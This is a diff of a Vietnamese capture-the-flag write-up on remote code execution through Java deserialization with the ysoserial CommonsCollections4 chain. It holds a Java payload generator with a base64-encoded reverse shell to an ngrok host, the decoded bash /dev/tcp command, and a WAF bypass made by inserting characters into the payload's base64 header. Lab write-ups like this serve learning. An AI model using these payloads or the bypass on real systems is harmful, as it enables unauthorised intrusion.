@@ -70,6 +70,7 @@ Tìm đến file `pom.xml`, là file chứa thông tin để build app trong mav
 
 ## Exploit
 Đến đây mình biết cần sử dụng gadget chain CC4 để exploit RCE, gadget này đã có sẵn trong tool ysoserial, ở Intellij mình có thể tạo 1 project Java và add `ysoserial.jar` as a library là có thể dùng được method tạo gadget có sẵn. Sau khi serialize gadget này, mình cần nén gzip lại rồi base64 encode cũng như replace lại luôn 1 số kí tự như ở server để gửi đi ở uri path mà không gây lỗi.
+
 **Script gen payload**:
 ```java
 import ysoserial.payloads.CommonsCollections4;
@@ -114,7 +115,7 @@ public class Exploit {
         try {
             // Serialize CommonsCollection4 RCE gadget chain từ ysoserial.
             CommonsCollections4 cc4 = new CommonsCollections4();
-            Object obj = cc4.getObject("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8wLnRjcC5hcC5uZ3Jvay5pby8xMzk5MiAwPiYx}|{base64,-d}|{bash,-i}"); // lấy reverse shell.
+            Object obj = cc4.getObject("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8wLnRjcC5hcC5uZ3Jvay5pby8xMzk5MiAwPiYx}|{base64,-d}|{bash,-i}"); // command lấy reverse shell.
             FileOutputStream fos = new FileOutputStream("cc4.txt");
             ObjectOutputStream oos = new ObjectOutputStream(fos);
             oos.writeObject(obj);
@@ -134,8 +135,11 @@ public class Exploit {
 }
 ```
 
-Lưu ý method `getObject()` khi tạo payload CC4 nhận arg command dưới dạng là 1 string, cái mà sẽ được nạp vào method `Runtime.getRuntime.exec(string)` để thực thi command. Mà method [exec(string) trong Java sẽ tự động split string dựa vào dấu space thành 1 string array](https://askcodes.net/coding/why-does-runtime-exec-string--work-for-some-but-not-all-commands-) để pass như các command arguments cho nên chỗ command này mình cần escape dấu space. 
-
+**Lưu ý**: 
+1. Server(docker) không có các tool như curl, ping, nc,... nên không thể sử dụng để lấy luôn flag được, phải lấy được shell.
+2. Method `getObject()` khi tạo payload CC4 nhận arg command dưới dạng là 1 string, cái mà sẽ được nạp vào method `Runtime.getRuntime.exec(string)` để thực thi command. Mà method [exec(string) trong Java sẽ tự động split string dựa vào dấu space thành 1 string array](https://askcodes.net/coding/why-does-runtime-exec-string--work-for-some-but-not-all-commands-) để pass như các command arguments cho nên chỗ command này mình cần escape dấu space. 
+2. `Runtime.getRuntime.exec()` có nhiều hạn chế hơn 1 shell bình thường nên 1 số ký tự, command không thể intepret hay escape nên ví dụ với command `bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/13992 0>&1` có chứa `>&` thì cần được escape nên mình base64 encode luôn đoạn này.
+![unknown](https://user-images.githubusercontent.com/71699412/196038602-0b373191-5a43-46db-9487-cbd9c684a216.png)
 
 Đến đây nếu gửi luôn payload lên server thì sẽ bị trả về: ` 403: Deserialization of Untrusted Data Detected. (From real WAF with <3)` do firewall mình đã nhắc ở trên.
 
@@ -158,7 +162,7 @@ server {
 
 }
 ```
-`H4sI` là đoạn base64 encode của magic byte file gzip cũng như mode compress. Mình có ngồi cố sửa byte header để khi base64 encode sẽ khác đi nhằm bypass nhưng không ăn thua cho đến khi thử fuzz chèn kí tự bất kì khác chữ và số thì có thể bypass được.
+`H4sI` là đoạn base64 encode của magic byte + mode compress của file gzip. Mình có ngồi cố sửa byte header để khi base64 encode sẽ khác đi nhằm bypass nhưng không ăn thua cho đến khi mình thử fuzz chèn dấu space vào giữa thì lại bypass được. Ngoài dấu space thì các ký tự còn lại theo mình thử thì nếu khác null hay khác chứ cái + chữ số thì đều có thể bypass được - chưa hiểu tại sao??
 
 Ở đây firewall cũng check uri size chỉ được phép bé hơn 3000 bytes nhưng khi compress và base64 encode payload mình không gặp vấn đề nào về size limit dù ở đây không có size limit thì vẫn phải gzip payload lại để không bị lỗi.
 
